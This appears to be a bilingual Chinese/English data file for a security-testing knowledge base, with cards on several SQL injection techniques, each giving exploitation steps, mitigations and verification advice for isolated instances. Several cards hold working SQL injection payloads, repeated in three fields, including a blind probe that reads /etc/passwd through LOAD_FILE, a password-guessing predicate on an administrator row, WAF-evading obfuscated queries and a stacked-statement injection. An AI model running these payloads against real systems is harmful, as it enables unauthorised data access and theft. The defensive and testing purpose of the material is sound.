exploitation.zh: 用无 UNION 的合法值和纯换行控制建立基线，将查询目标改为固定常量后提交一次样例。关联每层解码、最终 SQL、数据库审计和结果。WAF 放行、400 或慢响应不成立；固定常量进入结果才确认。
exploitation.en: Baseline a valid value and a newline-only control, replace the query target with a fixed constant, and submit the sample once. Correlate each decode stage, final SQL, audit, and result. WAF acceptance, 400, or latency is insufficient; the fixed constant in output confirms it.

mitigation.zh: 参数化查询并禁止用户控制 SQL 结构，在应用入口执行确定性一次解码并拒绝异常控制字符。WAF 可统一规范化后检测但仅作补充，回归应保留原编码字节和完全解码语义。
mitigation.en: Parameterize queries and prevent user control of SQL structure, perform deterministic single decoding at application entry, and reject abnormal controls. A WAF may normalize consistently as defense in depth, and regression should retain both raw bytes and fully decoded semantics.

title.zh: 记录各层解码基线
title.en: Record decoding baselines at every layer

description.zh: 比较合法值、纯换行控制与原始编码在代理和应用中的规范化结果。
description.en: Compare valid input, newline-only control, and raw encoding through proxy and application normalization.

title.zh: 提交固定常量 UNION 样例

description.zh: 替换 current_user 后提交并捕获最终 SQL 与结果。
description.en: Replace current_user, submit the sample, and capture final SQL and result.

title.zh: 确认数据库分词差异

description.zh: 匹配完全解码语句、注释边界、查询审计和固定标记，排除 HTTP 头行为。
description.en: Match the fully decoded statement, comment boundary, query audit, and fixed marker, excluding HTTP-header behavior.

title.zh: 参数化并统一解码回归

description.zh: 修复后重放原字节和合法输入，确认 SQL 语义不再改变。
description.en: After remediation replay raw bytes and valid input to confirm SQL semantics no longer change.

analysis.zh: 尽管字节包含 CRLF，它属于 SQL 词法规范化。报告要给出完全解码后的 SQL 和结果证据，不应误分类为 HTTP 请求/响应拆分。
analysis.en: Although the bytes contain CRLF, this is SQL lexical normalization. Report fully decoded SQL and result evidence and do not misclassify it as HTTP request or response splitting.

opsecTips.zh: 只返回固定常量并限制一行结果，不读取数据库用户或目录。
opsecTips.en: Return only a fixed constant and one row; do not read database users or directories.

opsecTips.zh: 只提交一次编码样例并保留原始字节，避免重复慢查询和日志噪声。
opsecTips.en: Submit the encoded sample once and preserve raw bytes to avoid repeated expensive queries and log noise.

name.zh: WordPress URL 包装 UNION 查询

description.zh: 使用完整 WordPress 风格 URL 中的 vulnparam 验证查询参数从 HTTP 路由进入 SQL UNION 语义的端到端数据流。
description.en: Uses a complete WordPress-style URL with vulnparam to test the end-to-end flow from HTTP routing into SQL UNION semantics.

subCategory.zh: URL 查询参数 SQL 注入

prerequisites.zh: 已确认目标插件或测试路由使用 vulnparam 构造数据库查询
prerequisites.en: A target plugin or test route is confirmed to build a database query from vulnparam.

prerequisites.zh: host.com 替换为隔离实例且数据库只含伪版本标记
prerequisites.en: host.com is replaced with an isolated instance whose database exposes only a synthetic version marker.

title.zh: 完整 URL 查询参数样例

description.zh: 把主机改为隔离实例、@@version 改为固定测试常量，并确认 iThemes 参数是否只是路由条件；不要向无关 WordPress 站点发送。
description.en: Replace the host with an isolated instance, change @@version to a fixed test constant, and determine whether the iThemes parameter is only a routing condition; do not send this to unrelated WordPress sites.

overview.zh: 该行是完整 HTTP URL，而不是裸 SQL 片段，适合说明路由参数、插件条件和数据库查询之间的端到端关系。只有隔离目标实际解析 vulnparam 并将固定常量合并到结果时才成立。
overview.en: This line is a complete HTTP URL rather than a bare SQL fragment and documents the end-to-end relationship among routing parameters, plugin conditions, and database queries. It is valid only when the isolated target parses vulnparam and merges a fixed constant into the result.

vulnerability.zh: 根因是 WordPress 插件或自定义处理器从查询字符串读取 vulnparam 并拼接 SQL；附加参数可能触发特定路由或绕过常规入口。URL 编码和参数路由由框架处理，最终数据库仍收到未参数化结构。
vulnerability.en: The cause is a WordPress plugin or custom handler reading vulnparam from the query string and concatenating SQL; an extra parameter may select a route or unusual entry point. Framework URL decoding still delivers unparameterized structure to the database.

exploitation.zh: 确认插件、路由和版本后，在隔离副本用合法 vulnparam 建立基线，将 UNION 目标替换为固定常量并请求一次。关联 Web 请求、插件处理日志、最终 SQL 和结果。404、路由命中或 WAF 放行不证明注入。
exploitation.en: After confirming plugin, route, and version, baseline a valid vulnparam in an isolated copy, replace the UNION target with a fixed constant, and request once. Correlate web request, plugin logs, final SQL, and output. A 404, route match, or WAF acceptance does not prove injection.

mitigation.zh: 升级或修复对应插件，使用 WordPress 数据库参数化 API 和严格参数类型，移除隐藏路由触发条件。边界只允许预期参数，数据库账户最小权限，并保留完整 URL 的回归用例。
mitigation.en: Patch or update the relevant plugin, use parameterized WordPress database APIs and strict parameter types, and remove hidden route triggers. Allow only expected parameters at the edge, minimize database privilege, and retain the complete URL as a regression case.

title.zh: 确认插件路由和参数数据流
title.en: Confirm plugin route and parameter flow

description.zh: 在隔离实例定位 vulnparam、附加路由参数和最终数据库调用。
description.en: In an isolated instance locate vulnparam, the additional routing parameter, and the final database call.

title.zh: 请求固定常量 URL

description.zh: 替换主机与版本函数后只请求一次，并保留完整访问/查询日志。
description.en: Replace the host and version function, request once, and retain complete access and query logs.

title.zh: 确认 HTTP 到 SQL 因果链

description.zh: 匹配请求 ID、插件处理、最终 SQL 和固定标记输出。
description.en: Match request ID, plugin handling, final SQL, and fixed marker output.

title.zh: 修复插件并回归完整 URL
title.en: Patch the plugin and regress the full URL

description.zh: 参数化后重放合法 URL 与样例，确认路由正常且 SQL 结构固定。
description.en: After parameterization replay valid URLs and the sample to confirm routing works with fixed SQL structure.

analysis.zh: 该卡强调端到端归因：完整 URL 命中路由不等于数据库注入，必须有最终 SQL 与测试常量结果。若目标并非对应插件，应视为不适用。
analysis.en: This card emphasizes end-to-end attribution: route matching does not equal SQL injection without final SQL and fixed-constant output. It is not applicable when the identified plugin or route is absent.

opsecTips.zh: 仅对已确认插件的隔离副本请求一次，不扫描公共 WordPress 站点。
opsecTips.en: Request once only against an isolated copy of the confirmed plugin and do not scan public WordPress sites.

opsecTips.zh: 把版本函数替换为固定常量并限制数据库返回，不收集产品版本或真实数据。
opsecTips.en: Replace the version function with a fixed constant and limit output; do not collect product versions or real data.

name.zh: 盲注条件、时间与谓词探测
name.en: Blind SQL Conditional, Timing, and Predicate Probes

description.zh: 使用 SLEEP、BENCHMARK、字符串函数、文件条件、DCount/ANY 与元数据谓词验证无回显查询中的可重复真假或时间信道。
description.en: Uses SLEEP, BENCHMARK, string functions, file conditions, DCount or ANY, and metadata predicates to test repeatable Boolean or timing channels in nonreflective queries.

prerequisites.zh: 输入影响数据库查询但响应不直接回显结果
prerequisites.en: Input affects a database query whose result is not directly reflected.

prerequisites.zh: 隔离环境可采集多次时延样本和数据库审计
prerequisites.en: The isolated environment can collect repeated latency samples and database audit.

title.zh: 盲注真假与时间样例

execution.command:
SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
1%0b||%0bLPAD(USER,7,1)
state=%2527+and+
(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1

description.zh: 其中 state/case/BENCHMARK 三行是一个连续样例。按已确认方言选择测试谓词，把文件、用户和密码条件替换为测试数据，并成对运行真/假条件。
description.en: The state, case, and BENCHMARK lines form one continuous sample. Choose a predicate for the confirmed dialect, replace file, user, and password conditions with test data, and run paired true and false controls.

title.zh: 盲注规范化复测

wafBypass.command:
SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
1%0b||%0bLPAD(USER,7,1)
state=%2527+and+
(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)

description.zh: 保留原始复测行，比较边界规范化与数据库真假/时间结果；测试时不得使用真实文件和账户条件。
description.en: Preserves original retest lines for comparing edge normalization with database Boolean or timing behavior; replace real file and account predicates during testing.

overview.zh: 盲注通过真假响应或可控延迟推断查询语义。网络抖动、缓存和连接池会造成假阳性，因此必须使用成对谓词、多次交错采样和数据库审计，而不是凭单次慢请求判断。
overview.en: Blind injection infers query semantics through Boolean responses or controlled delay. Network jitter, caching, and connection pools create false positives, so use paired predicates, repeated interleaved samples, and database audit rather than one slow request.

vulnerability.zh: 根因仍是动态拼接 SQL，只是结果不直接返回。条件函数、时间函数或元数据谓词可让攻击者控制执行分支，从响应差异或运行时间逐位推断数据。
vulnerability.en: The root cause remains dynamic SQL composition, but results are not reflected. Conditional or timing functions and metadata predicates let input control execution branches and infer data from responses or latency.

exploitation.zh: 先用固定真/假业务输入测量基线，选择目标方言的无敏感谓词并交错运行真、假和无延迟对照至少多轮。结合数据库查询持续时间和计划确认。只有统计稳定且审计显示对应函数执行才成立。
exploitation.en: Baseline fixed true and false business inputs, choose a nonsensitive dialect-specific predicate, and interleave true, false, and no-delay controls over multiple rounds. Correlate database duration and plan. Count only stable statistical separation with matching function execution in audit.

mitigation.zh: 参数化所有值并将动态查询分支映射到固定模板，限制数据库时间/文件/元数据函数权限和语句超时。统一错误响应与缓存策略，并用真假成对用例回归。
mitigation.en: Parameterize all values and map dynamic branches to fixed templates, restrict timing, file, and metadata functions and set statement timeouts. Normalize error and cache behavior and regress paired true and false cases.

title.zh: 建立交错时延基线

description.zh: 交错采集合法真/假和无延迟请求，记录应用与数据库耗时。
description.en: Interleave valid true, false, and no-delay requests and record application and database durations.

title.zh: 提交无敏感成对谓词

description.zh: 选择已确认方言的一组样例，把目标替换为测试数据并多轮运行真假条件。
description.en: Choose a sample for the confirmed dialect, replace targets with test data, and run true and false conditions over multiple rounds.

attackChain.payload:
SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
1%0b||%0bLPAD(USER,7,1)
state=%2527+and+
(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1

title.zh: 关联数据库执行证据

description.zh: 比较分布并匹配最终 SQL、函数调用和查询持续时间，排除网络抖动与缓存。
description.en: Compare distributions and match final SQL, function calls, and query duration, excluding network jitter and caching.

title.zh: 参数化并重放统计基线
title.en: Parameterize and replay the statistical baseline

description.zh: 修复后按相同采样设计重放，确认真假请求时延收敛且业务结果正确。
description.en: After remediation replay the same sampling design to confirm true and false timing converges while business results remain correct.

analysis.zh: 单次慢响应不是证据。应报告样本量、中位数/分位数、真假差异、数据库执行日志和控制组，且不从生产敏感数据构造谓词。
analysis.en: One slow response is not evidence. Report sample size, medians or percentiles, true-false separation, database logs, and controls, without predicates over production-sensitive data.

opsecTips.zh: 把 5 秒/高迭代延迟降到隔离环境可识别的最小值并严格限制轮数。
opsecTips.en: Reduce five-second or high-iteration delays to the smallest distinguishable value in isolation and strictly limit rounds.

opsecTips.zh: 文件、用户名和密码条件全部替换为测试记录，不推断真实凭据。
opsecTips.en: Replace file, username, and password predicates with test records and never infer real credentials.

name.zh: 直接 SQL 语句与目录表选择
name.en: Direct SQL Statement and Catalog Selection

description.zh: 使用直接 SELECT 与 Oracle ALL_TABLES 目录查询验证输入是否能形成独立 SQL 语句或改变查询目标。
description.en: Uses a direct SELECT and Oracle ALL_TABLES catalog query to test whether input forms an independent statement or changes the queried relation.

prerequisites.zh: 输入可能进入允许分号或动态表选择的数据库调用
prerequisites.en: Input may enter a database call that permits semicolons or dynamic relation selection.

prerequisites.zh: 测试数据库含专用 TARGET_TABLE 和目录访问审计
prerequisites.en: The test database contains a dedicated TARGET_TABLE and catalog-access audit.

title.zh: 直接语句样例

description.zh: 只对测试表使用，并以固定一行伪数据作为结果；记录驱动是否允许多语句和最终 SQL。
description.en: Use only against a test table with one fixed synthetic row and record whether the driver permits multiple statements and the final SQL.

title.zh: 直接语句与 Oracle 目录复测
title.en: Direct Statement and Oracle Catalog Retest

wafBypass.command:
"; select * from TARGET_TABLE --
sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'

description.zh: 保留原始大小写与语句样例；测试时将 OWNER 和表名替换为专用测试 schema。
description.en: Preserves original case and statement samples; replace OWNER and relation names with a dedicated test schema during validation.

overview.zh: 直接语句和系统目录查询不是同一数据库方言的通用 payload，但都验证输入能否超出原参数成为查询结构。应先识别驱动是否允许多语句及具体数据库，再选择相应样例。
overview.en: Direct statements and catalog queries are not universal across dialects, but both test whether input escapes parameter context into query structure. Identify driver multi-statement behavior and database product before choosing a sample.

vulnerability.zh: 根因是拼接 SQL 片段或动态表/schema 名，并让数据库驱动接受语句终止符或未验证标识符。攻击者可切换到测试表或系统目录，扩大元数据可见性。
vulnerability.en: The cause is concatenating SQL fragments or dynamic relation or schema names while the driver accepts terminators or unchecked identifiers. Input can switch to another relation or a system catalog and expand metadata visibility.

exploitation.zh: 在专用 schema 先记录合法表查询，确认方言后只提交匹配样例，并关联最终 SQL 与固定伪数据/目录行。语法错误、大小写绕过 WAF 或数据库指纹不证明未授权读取。
exploitation.en: Baseline a valid relation in a dedicated schema, submit only the matching dialect sample, and correlate final SQL with fixed synthetic data or catalog rows. Syntax errors, WAF case bypass, or fingerprinting do not prove unauthorized read.

mitigation.zh: 参数值使用绑定变量，动态表、schema 和列名通过服务端枚举映射；数据库驱动关闭多语句，账户限制系统目录与非业务 schema 权限，并审计异常目录访问。
mitigation.en: Bind parameter values, map dynamic relation, schema, and column names through server-side enums, disable driver multi-statements, restrict account access to catalogs and nonbusiness schemas, and audit anomalous catalog access.

title.zh: 确认驱动与数据库方言

description.zh: 记录多语句配置、允许标识符和专用 schema 的合法查询。
description.en: Record multi-statement configuration, allowed identifiers, and a valid query in the dedicated schema.

title.zh: 提交匹配的测试语句

description.zh: 只指向 TARGET_TABLE 测试对象并保留最终 SQL 与请求关联。
description.en: Target only the dedicated TARGET_TABLE and preserve final SQL and request correlation.

title.zh: 确认查询结构越界

description.zh: 用固定伪数据或审计中的目录访问证明查询目标改变，排除错误差异。
description.en: Use fixed synthetic data or audited catalog access to prove the queried relation changed, excluding error differences.

title.zh: 绑定值并允许列举标识符

description.zh: 关闭多语句和动态标识符后重放合法及攻击样例，确认查询范围固定。
description.en: After disabling multi-statements and dynamic identifiers, replay valid and attack samples to confirm fixed query scope.

analysis.zh: 必须说明具体方言和驱动能力。若样例只产生语法错误或系统目录本来公开，应按信息项而非未授权数据读取处理。
analysis.en: State the exact dialect and driver capability. If a sample only causes syntax errors or the catalog is intentionally public, treat it as an observation rather than unauthorized data access.

opsecTips.zh: 只查询专用 schema 与一行伪数据，不枚举真实业务目录。
opsecTips.en: Query only a dedicated schema and one synthetic row, never real business catalogs.

opsecTips.zh: 一次只验证一个方言，避免无关语法错误和数据库负载。
opsecTips.en: Validate one dialect at a time to avoid irrelevant syntax errors and database load.

name.zh: SQL INTO OUTFILE 写文件原语

description.zh: 使用 INTO OUTFILE 语法验证注入查询和数据库账户是否能够在数据库主机文件系统写入测试标记。
description.en: Uses INTO OUTFILE syntax to test whether an injected query and database account can write a marker into the database host filesystem.

prerequisites.zh: 仅在可回滚数据库容器中验证写文件能力
prerequisites.en: File-write capability is tested only in a disposable database container.

prerequisites.zh: 测试目录非 Web 根目录且只允许写入固定标记
prerequisites.en: The test directory is outside the web root and accepts only a fixed marker.

title.zh: OUTFILE 写入样例

description.zh: 把 xxx 替换为一次性容器中的专用空目录和随机文件名，只写固定无害标记；不得写入 Web 根或系统路径。
description.en: Replace xxx with a random filename in a dedicated empty directory in a disposable container and write only a fixed harmless marker; never target web roots or system paths.

overview.zh: 数据库文件写入是 SQL 注入的权限影响验证，不应作为常规发现步骤。只有隔离容器中的测试文件由数据库进程创建且内容与唯一标记一致，才能确认；错误信息提到 OUTFILE 不足。
overview.en: Database file write is a privilege-impact validation after SQL injection, not a routine discovery step. Confirmation requires the database process to create the uniquely marked test file in a disposable container; an OUTFILE error is insufficient.

vulnerability.zh: 链条需要注入点控制查询结构、驱动允许相应语句、数据库账户具备 FILE 类权限，并且数据库进程文件系统可写。若可写目录被 Web 服务器执行，风险可进一步升级，但必须单独证明。
vulnerability.en: The chain requires control of query structure, driver support, a database account with file privilege, and a writable database-host filesystem. Risk can escalate if a writable directory is web-executable, but that boundary must be proven separately.

exploitation.zh: 在一次性数据库容器准备不可执行空目录，使用随机文件名和固定标记提交一次样例。关联数据库审计、进程文件写入和文件哈希，随后立即删除。不得写脚本内容、覆盖现有文件或测试生产路径。
